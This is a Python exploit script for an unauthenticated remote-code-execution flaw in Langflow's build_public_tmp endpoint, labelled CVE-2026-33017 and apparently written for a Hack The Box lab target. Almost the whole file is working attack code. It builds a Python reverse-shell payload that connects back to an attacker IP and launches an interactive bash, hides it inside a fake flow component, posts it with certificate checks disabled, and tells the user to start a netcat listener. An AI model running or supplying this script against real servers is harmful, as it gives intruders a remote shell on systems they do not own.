#!/usr/bin/env python3
"""
CVE-2026-33017 Langflow/FireFlow Exploit
Unauthenticated RCE via build_public_tmp endpoint
"""

import requests
import json
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings since we're disabling verification
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def create_exploit_payload(kali_ip, kali_port=4444):
    """Create the reverse shell payload."""
    reverse_shell_code = f'''import os,socket,subprocess as sp

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{kali_ip}",{kali_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
sp.call(["/bin/bash","-i"])

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name="X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={{}})'''
    
    return reverse_shell_code

def exploit(kali_ip, flow_id, domain, kali_port=4444):
    """Execute the exploit against the target."""
    
    # Build the target URL
    url = f"https://{domain}/api/v1/build_public_tmp/{flow_id}/flow"
    
    # Create the malicious code payload
    malicious_code = create_exploit_payload(kali_ip, kali_port)
    
    # Build the complete JSON payload
    payload = {
        "data": {
            "nodes": [{
                "id": "Exploit-001",
                "type": "genericNode",
                "position": {"x": 0, "y": 0},
                "data": {
                    "id": "Exploit-001",
                    "type": "ExploitComp",
                    "node": {
                        "template": {
                            "code": {
                                "type": "code",
                                "required": True,
                                "show": True,
                                "multiline": True,
                                "value": malicious_code,
                                "name": "code",
                                "password": False,
                                "advanced": False,
                                "dynamic": False
                            },
                            "_type": "Component"
                        },
                        "description": "X",
                        "base_classes": ["Data"],
                        "display_name": "ExploitComp",
                        "name": "ExploitComp",
                        "frozen": False,
                        "outputs": [{
                            "types": ["Data"],
                            "selected": "Data",
                            "name": "o",
                            "display_name": "O",
                            "method": "r",
                            "value": "__UNDEFINED__",
                            "cache": True,
                            "allows_loop": False,
                            "tool_mode": False,
                            "hidden": None,
                            "required_inputs": None,
                            "group_outputs": False
                        }],
                        "field_order": ["code"],
                        "beta": False,
                        "edited": False
                    }
                }
            }],
            "edges": []
        },
        "inputs": None
    }
    
    # Headers
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    
    # Cookies
    cookies = {
        "client_id": "attacker"
    }
    
    print(f"[*] Target: {url}")
    print(f"[*] Reverse shell to: {kali_ip}:{kali_port}")
    print(f"[*] Flow ID: {flow_id}")
    print(f"[*] Sending payload...")
    
    try:
        # Send the POST request with SSL verification disabled
        response = requests.post(
            url,
            headers=headers,
            cookies=cookies,
            json=payload,
            verify=False,  # Disable SSL verification
            timeout=10
        )
        
        print(f"\n[+] Response Status Code: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[+] Payload sent successfully!")
            print(f"[+] Check your netcat listener on port {kali_port}")
        elif response.status_code == 404:
            print(f"[-] Flow ID not found. Verify the flow_id is correct.")
        elif response.status_code == 403:
            print(f"[-] Access forbidden. The endpoint may be protected.")
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            print(f"[-] Response body: {response.text[:200]}")
            
    except requests.exceptions.SSLError as e:
        print(f"[-] SSL Error: {e}")
        print(f"[!] Make sure you're using https:// and verify=False is set")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection Error: {e}")
        print(f"[!] Check if the domain is reachable")
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-33017 Langflow/FireFlow Exploit - Reverse Shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Example usage:
  python3 exploit.py -i 10.10.15.134 -f 7d84d636-af65-42e4-ac38-26e867052c25 -d flow.fireflow.htb
  python3 exploit.py -i 10.10.15.134 -f <flow_id> -d flow.fireflow.htb -p 4444
        '''
    )
    
    parser.add_argument('-i', '--ip', required=True, help='Your Kali IP address')
    parser.add_argument('-f', '--flow-id', required=True, help='Target flow UUID')
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., flow.fireflow.htb)')
    parser.add_argument('-p', '--port', default=4444, type=int, help='Kali listener port (default: 4444)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2026-33017 Langflow/FireFlow Exploit")
    print("=" * 60)
    
    # Run the exploit
    exploit(args.ip, args.flow_id, args.domain, args.port)
    
    print("\n[!] Remember to start your listener:")
    print(f"    nc -lvnp {args.port}")

if __name__ == '__main__':
    main()   
